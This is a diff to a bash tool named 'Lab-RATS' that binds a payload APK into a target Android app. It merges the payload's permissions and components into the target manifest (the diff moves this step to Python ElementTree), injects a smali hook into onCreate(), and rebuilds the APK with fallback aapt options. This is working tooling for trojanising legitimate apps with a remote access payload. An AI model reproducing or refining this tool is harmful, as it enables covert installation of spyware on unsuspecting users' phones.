@@ -1,13 +1,46 @@
 #!/bin/bash
 
-#################################################
-#                   Lab-RATS                    #
-#                                               #
-#    Smali Surgery & APK Binding Script (Unix)  #
-#                v1.6.0 Hardened                #
-#                                               #
-#             Developed by: K4N3CO              #
-#################################################
+# Banner
+print_banner() {
+    clear
+    echo -e "${CYAN}"
+    echo " ┌───────────────────────────────────────────────────────────────────────┐"
+    echo " │                                  .-         .                         │"
+    echo " │                               ....-        :                          │"
+    echo " │                            -==--+:.+. ..  -..+:-+                     │"
+    echo " │                            ++---:+.-==+==#:.+---+#                    │"
+    echo " │                             :=---:+++++=++=**-:-:                     │"
+    echo " │                               --+++:-=+++++++-=                       │"
+    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
+    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
+    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
+    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
+    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
+    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
+    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
+    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
+    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
+    echo " │                   --------=--:=:-:-====+++-                           │"
+    echo " │                       .--++++--++:+++==:=+.                           │"
+    echo " │                        .:+++::::--:..:-+=                             │"
+    echo " │                       .--=+=-+-+    -:---*---                         │"
+    echo " │                                                                       │"
+    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
+    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
+    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
+    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"
+    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
+    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"
+    echo " │                                                                       │"
+    echo " │     Smali Surgery & APK Binding Script (Unix) | v1.6.0 Hardened       │"
+    echo " │                                                                       │"
+    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
+    echo " │                         DEVELOPED BY K4N3CO                           │"
+    echo " │                               © 2026                                  │"
+    echo " └───────────────────────────────────────────────────────────────────────┘"
+    echo -e "${NC}"
+    echo ""
+}
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -168,25 +201,36 @@ grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
     fi
 done
 
-# POSIX awk script to cleanly extract self-contained XML component blocks without splitting multiline tags
-LABRATS_COMPS=$(awk '
-BEGIN { RS="<"; FS=">" }
-NR > 1 {
-    tag = $0
-    if (tag ~ /^(service|receiver|provider|activity)[^>]*com\.labs\.labrats/) {
-        print "<" tag
-    }
-}
-' "$PAYLOAD_MANIFEST")
+# Perform 100% valid XML manifest surgery via Python ElementTree
+python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" << 'EOF'
+import sys, xml.etree.ElementTree as ET
 
-echo "$LABRATS_COMPS" | while read -r comp; do
-    if [ -n "$comp" ]; then
-        COMP_NAME=$(echo "$comp" | grep -o 'android:name="[^"]*"' | cut -d'"' -f2)
-        if [ -n "$COMP_NAME" ] && ! grep -q "$COMP_NAME" "$TARGET_MANIFEST"; then
-            sed -i.bak "s|</application>|        $comp\n    </application>|1" "$TARGET_MANIFEST"
-        fi
-    fi
-done
+payload_path, target_path = sys.argv[1], sys.argv[2]
+ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
+
+try:
+    payload_root = ET.parse(payload_path).getroot()
+    payload_app = payload_root.find('application')
+
+    with open(target_path, 'r', encoding='utf-8') as f:
+        target_xml = f.read()
+
+    if payload_app is not None:
+        injections = []
+        for elem in payload_app:
+            name = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
+            if 'com.labs.labrats' in name and name not in target_xml:
+                elem_str = ET.tostring(elem, encoding='utf-8').decode('utf-8')
+                injections.append(elem_str)
+
+        if injections:
+            injection_block = "\n    " + "\n    ".join(injections) + "\n</application>"
+            target_xml = target_xml.replace("</application>", injection_block, 1)
+            with open(target_path, 'w', encoding='utf-8') as f:
+                f.write(target_xml)
+except Exception as e:
+    print(f"Manifest Surgery Error: {e}")
+EOF
 
 rm -f "$TARGET_MANIFEST.bak"
 echo -e "${GREEN}[✓] Manifest surgery completed.${NC}"
@@ -309,22 +353,23 @@ EOF
     echo -e "${GREEN}[✓] Smali hook injected into new onCreate() method.${NC}"
 fi
 
-# Detect native Android SDK aapt / aapt2 binary (prefer stable 30-34 to prevent 37.0.0 SIGBUS exit code 138)
-NATIVE_AAPT_FLAG=""
+# Detect native Android SDK aapt / aapt2 binaries (prefer stable 30-34 aapt v1 to prevent AAPT2 exit code 138)
+AAPT1_BIN=""
+AAPT2_BIN=""
+
 if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
     STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/3[0-4]* 2>/dev/null | tail -n1)
     if [ -z "$STABLE_BT" ]; then
         STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
     fi
-    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/aapt2" ]; then
-        NATIVE_AAPT_FLAG="--aapt $STABLE_BT/aapt2"
-    elif [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/aapt" ]; then
-        NATIVE_AAPT_FLAG="--aapt $STABLE_BT/aapt"
+    if [ -n "$STABLE_BT" ]; then
+        [ -f "$STABLE_BT/aapt" ] && AAPT1_BIN="$STABLE_BT/aapt"
+        [ -f "$STABLE_BT/aapt2" ] && AAPT2_BIN="$STABLE_BT/aapt2"
     fi
-elif command -v aapt2 &> /dev/null; then
-    NATIVE_AAPT_FLAG="--aapt $(command -v aapt2)"
 elif command -v aapt &> /dev/null; then
-    NATIVE_AAPT_FLAG="--aapt $(command -v aapt)"
+    AAPT1_BIN="$(command -v aapt)"
+elif command -v aapt2 &> /dev/null; then
+    AAPT2_BIN="$(command -v aapt2)"
 fi
 
 # 9. Recompile & Sign
@@ -333,21 +378,24 @@ UNSIGNED_APK="$WORK_DIR/unsigned_bound.apk"
 ALIGNED_APK="$WORK_DIR/aligned_bound.apk"
 FINAL_BOUND_APK="$OUTPUT_DIR/bound_target.apk"
 
-# Attempt 1: Build with stable native AAPT if available
-if [ -n "$NATIVE_AAPT_FLAG" ]; then
-    $APKTOOL_CMD b $NATIVE_AAPT_FLAG --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
+# Attempt 1: Try building with stable AAPT1 (100% stable, zero AAPT2 SIGBUS crashes)
+if [ -n "$AAPT1_BIN" ]; then
+    $APKTOOL_CMD b --aapt "$AAPT1_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
 fi
 
-# Attempt 2: Fallback to apktool's internal bundled AAPT2
-if [ ! -f "$UNSIGNED_APK" ]; then
-    echo -e "${YELLOW}[!] Retrying build with apktool's internal bundled AAPT2...${NC}"
-    $APKTOOL_CMD b --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
+# Attempt 2: Try building with stable AAPT2
+if [ ! -f "$UNSIGNED_APK" ] && [ -n "$AAPT2_BIN" ]; then
+    $APKTOOL_CMD b --aapt "$AAPT2_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
 fi
 
-# Attempt 3: Build with -c (--copy-orig)
+# Attempt 3: Try building with AAPT1 and original binary resources (-c)
 if [ ! -f "$UNSIGNED_APK" ]; then
     echo -e "${YELLOW}[!] Retrying build with original binary resources (-c)...${NC}"
-    $APKTOOL_CMD b -c --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
+    if [ -n "$AAPT1_BIN" ]; then
+        $APKTOOL_CMD b --aapt "$AAPT1_BIN" -c --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
+    else
+        $APKTOOL_CMD b -c --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
+    fi
 fi
 
 # Attempt 4: Fallback build with diagnostic log output
